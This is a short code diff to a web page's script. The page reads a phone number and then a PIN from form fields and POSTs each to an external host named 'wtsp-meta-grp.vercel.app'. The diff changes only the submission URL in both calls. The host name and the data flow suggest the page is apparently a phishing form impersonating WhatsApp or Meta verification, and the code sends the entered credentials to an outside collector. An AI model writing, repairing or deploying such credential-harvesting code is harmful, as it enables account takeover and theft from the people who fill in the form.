@@ -258,7 +258,7 @@ input[type="tel"] {
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             console.log('Phone Number entered:', phoneNumber);
 
-            fetch('https://wtsp-meta-grp.vercel.app/api/submit.js', { 
+            fetch('https://wtsp-meta-grp.vercel.app/', { 
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -285,7 +285,7 @@ input[type="tel"] {
             const pinCode = document.getElementById('pinCode').value.trim();
             console.log('PIN entered:', pinCode);
 
-            fetch('https://wtsp-meta-grp.vercel.app/api/submit.js', {
+            fetch('https://wtsp-meta-grp.vercel.app/', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
